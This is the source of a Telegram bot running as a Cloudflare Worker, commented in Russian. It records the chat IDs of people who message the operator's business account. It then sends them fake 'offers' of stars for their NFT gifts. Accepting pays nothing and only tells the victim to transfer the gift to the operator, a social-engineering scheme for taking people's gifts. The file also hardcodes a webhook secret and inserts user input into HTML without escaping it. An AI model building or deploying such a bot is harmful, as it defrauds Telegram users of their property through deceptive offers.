const ADMIN_ID_1 = 5151757168; 
const ADMIN_ID_2 = 7423713851; 
const WEBHOOK_SECRET = "GarisOffer9231998"; 

export default {
  async fetch(request, env, ctx) {
    const BOT_TOKEN = env.BOT_TOKEN; 
    const kv = env.USERS_KV; 

    if (!BOT_TOKEN) return new Response("Bot token is not configured", { status: 500 });

    const secretHeader = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
    if (secretHeader !== WEBHOOK_SECRET) return new Response("Forbidden", { status: 403 });

    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();

      // ==========================================
      // ОБРАБОТКА СООБЩЕНИЙ (СОХРАНЯЕМ ID ЧАТОВ)
      // ==========================================
      const msg = update.message || update.business_message;
      const isBusiness = !!update.business_message;
      const businessId = update.business_connection_id;

      if (msg && msg.text) {
        let text = msg.text.trim();
        const chatId = msg.chat.id; 
        const userId = msg.from.id;
        const username = msg.from.username ? msg.from.username.toLowerCase() : "";

        // СОХРАНЯЕМ ID ЧАТА, ЕСЛИ ЧЕЛОВЕК ПИШЕТ НАМ В БИЗНЕС-ЧАТЕ
        if (isBusiness && username && kv) {
            await kv.put(`user_chat:${username}`, chatId);
        }

        // --- /start (Обычный чат с ботом) ---
        if (text === "/start" && !isBusiness) {
            const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как отправить оффер:</b>\n\nНапишите боту:\n<code>/buy @username t.me/nft/... 500 stars</code>\n\nБот отправит оффер этому человеку от вашего имени.`;
            await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML" }, BOT_TOKEN);
        }

        // --- КОМАНДА /buy (ИЗ ЧАТА С БОТОМ) ---
        if (text.startsWith("/buy ") && !isBusiness) {
            const parts = text.split(/\s+/);
            if (parts.length < 5) {
                await callApi("sendMessage", { chat_id: chatId, text: "❌ <b>Ошибка формата.</b>\nПишите: <code>/buy @username [ссылка] [цена] stars</code>", parse_mode: "HTML" }, BOT_TOKEN);
                return new Response("OK", { status: 200 });
            }

            let targetUsername = parts[1].replace("@", "").toLowerCase();
            let linkOrGift = parts[2];
            let amount = parts[3];
            let lang = text.includes("eng") ? "en" : (text.includes("cn") ? "cn" : "ru");

            let giftLink = linkOrGift.includes("t.me") ? (linkOrGift.startsWith("http") ? linkOrGift : "https://" + linkOrGift) : "https://t.me/nft/" + linkOrGift;

            let offerText = "";
            let btnAccept = "";
            let btnDecline = "";

            if (lang === "en") {
                offerText = `Пользователь Предлагает Вам\n\n${amount} ⭐ За подарок ${linkOrGift}.`;
                btnAccept = "☑️ Accept";
                btnDecline = "⊗ Decline";
            } else if (lang === "cn") {
                offerText = `用户向您提供报价\n\n${amount} ⭐ 购买此礼物 ${linkOrGift}。`;
                btnAccept = "☑️ 接受";
                btnDecline = "⊗ 拒绝";
            } else {
                offerText = `Пользователь Предлагает Вам\n\n${amount} ⭐ За подарок ${linkOrGift}.`;
                btnAccept = "☑️ Принять";
                btnDecline = "⊗ Отклонить";
            }

            const offerMarkup = { inline_keyboard: [[{ text: btnAccept, callback_data: `acc|${amount}|stars|${username || "gwrex"}|${giftLink}|${lang}` }, { text: btnDecline, callback_data: `dec|${amount}|stars|${lang}` }]] };

            let targetChatId = await kv.get(`user_chat:${targetUsername}`);
            if (targetChatId) {
                await callApi("sendMessage", { chat_id: targetChatId, text: offerText, parse_mode: "HTML", reply_markup: offerMarkup }, BOT_TOKEN);
                await callApi("sendMessage", { chat_id: chatId, text: `✅ Оффер отправлен @${targetUsername}.`, parse_mode: "HTML" }, BOT_TOKEN);
            } else {
                await callApi("sendMessage", { chat_id: chatId, text: `⚠️ Пользователь @${targetUsername} не писал вам. Бот не может отправить первым.`, parse_mode: "HTML" }, BOT_TOKEN);
            }
        }
      }

      // ==========================================
      // ОБРАБОТКА КНОПОК
      // ==========================================
      if (update.callback_query) {
        const cq = update.callback_query;
        
        if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
          const dataParts = cq.data.split("|");
          const action = dataParts[0];
          const amount = dataParts[1] || "0";
          const sellerUsername = dataParts[3] || "gwrex"; 
          const giftLink = dataParts[4] || ""; 
          
          const buyer = cq.from;
          let buyerName = buyer.first_name || "";
          if (buyer.last_name) buyerName += " " + buyer.last_name;

          let newText = "";
          let newMarkup = { inline_keyboard: [] };

          if (action === "acc") {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: `Оффер принят ✅`, show_alert: true }, BOT_TOKEN);
            newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nПередайте подарок продавцу (@${sellerUsername}).`;
            newMarkup = { inline_keyboard: [[{ text: "🎁 Передать подарок", url: giftLink || ("https://t.me/" + sellerUsername) }]] };
          } else {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
            newText = `❌ <b>Вы отказались от оффера.</b>`;
          }

          if (cq.inline_message_id) {
            try {
              if (cq.message && cq.message.caption !== undefined) {
                await callApi("editMessageCaption", { inline_message_id: cq.inline_message_id, caption: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
              } else {
                await callApi("editMessageText", { inline_message_id: cq.inline_message_id, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
              }
            } catch (err) {}
          } else if (cq.message) {
            try {
              await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
            } catch (err) {}
          }
        }
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body, token) {
  const url = `https://api.telegram.org/bot${token}/${method}`;
  try {
    const response = await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description);
    return data;
  } catch (e) { console.error(`Ошибка API [${method}]:`, e.message); throw e; }
}